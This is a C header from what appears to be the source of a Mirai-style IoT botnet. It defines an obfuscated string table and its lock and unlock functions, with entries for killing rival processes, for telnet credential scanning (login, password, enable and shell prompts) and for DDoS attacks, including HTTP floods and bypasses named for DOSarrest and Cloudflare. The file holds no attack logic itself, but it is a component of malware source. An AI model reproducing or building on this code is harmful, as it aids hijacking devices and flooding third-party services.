#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_DOMAIN			1
#define TABLE_SCAN_DOMAIN		3

#define TABLE_EXEC_SUCCESS		4

#define TABLE_KILLER_PROC		5
#define TABLE_KILLER_EXE		6
#define TABLE_KILLER_FD			7
#define TABLE_KILLER_TCP		8
#define TABLE_KILLER_MAPS		9
#define TABLE_MEM_ROUTE			10
#define TABLE_MEM_ASSWORD		11
#define TABLE_KILLER_STATUS		12

#define TABLE_ATK_VSE			13
#define TABLE_ATK_RESOLVER		14
#define TABLE_ATK_NSERV			15

#define TABLE_SCAN_OGIN			16
#define TABLE_SCAN_ENTER		17
#define TABLE_SCAN_ASSWORD		18
#define TABLE_SCAN_QUERY		19
#define TABLE_SCAN_RESP			20
#define TABLE_SCAN_NCORRECT		21
#define TABLE_SCAN_ENABLE		22
#define TABLE_SCAN_SYSTEM		23
#define TABLE_SCAN_SHELL		24
#define TABLE_SCAN_SH			25

#define TABLE_MISC_RAND			26
#define TABLE_MISC_DOG			27
#define TABLE_MISC_DOG1			28
#define TABLE_MISC_DOG2			29
#define TABLE_MISC_DOG3			30
#define TABLE_MISC_DOG4			31
#define TABLE_MISC_DOG5			32
#define TABLE_MISC_DOG6			33

#define TABLE_ATK_KEEP_ALIVE            57
#define TABLE_ATK_ACCEPT                58
#define TABLE_ATK_ACCEPT_LNG            59
#define TABLE_ATK_CONTENT_TYPE          60
#define TABLE_ATK_SET_COOKIE            61
#define TABLE_ATK_REFRESH_HDR           62
#define TABLE_ATK_LOCATION_HDR          63
#define TABLE_ATK_SET_COOKIE_HDR        64
#define TABLE_ATK_CONTENT_LENGTH_HDR    65
#define TABLE_ATK_TRANSFER_ENCODING_HDR 66
#define TABLE_ATK_CHUNKED               67
#define TABLE_ATK_KEEP_ALIVE_HDR        68
#define TABLE_ATK_CONNECTION_HDR        69
#define TABLE_ATK_DOSARREST             70
#define TABLE_ATK_CLOUDFLARE_NGINX      71

#define TABLE_HTTP_ONE                  72
#define TABLE_HTTP_TWO                  73
#define TABLE_HTTP_THREE                74
#define TABLE_HTTP_FOUR                 75 
#define TABLE_HTTP_FIVE                 76

#define TABLE_ATK_HTTP					77
#define TABLE_ATK_USERAGENT 			78  
#define TABLE_ATK_HOST					79  
#define TABLE_ATK_COOKIE				80 
#define TABLE_ATK_SEARCHHTTP			81 
#define TABLE_ATK_URL                   82 
#define TABLE_ATK_POST					83


#define TABLE_MAX_KEYS					84

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
